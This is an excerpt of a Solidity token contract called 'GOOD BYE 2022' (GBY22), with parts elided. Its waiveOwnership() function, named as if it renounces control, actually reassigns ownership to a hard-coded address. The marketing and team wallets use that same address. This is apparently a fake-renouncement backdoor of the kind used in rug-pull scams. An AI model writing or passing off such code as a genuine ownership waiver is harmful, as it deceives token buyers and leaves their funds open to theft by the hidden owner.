...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xFC174cc2447C9DfCF4924DF72FB07FEE0B539358);
    }
...
contract GBY22 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "GOOD BYE 2022";
    string private _symbol = "GBY22";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xFC174cc2447C9DfCF4924DF72FB07FEE0B539358);
    address payable public teamWalletAddress = payable(0xFC174cc2447C9DfCF4924DF72FB07FEE0B539358);
